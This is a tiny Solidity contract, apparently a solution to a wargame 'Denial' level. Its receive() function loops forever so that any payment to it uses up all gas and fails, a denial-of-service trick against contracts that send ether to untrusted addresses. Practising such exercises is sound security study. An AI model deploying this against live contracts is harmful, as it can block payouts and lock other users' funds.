// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract DenialRun {
  uint noting;
  receive() external payable {
    while(true){
      noting = 1;
    }
  }

}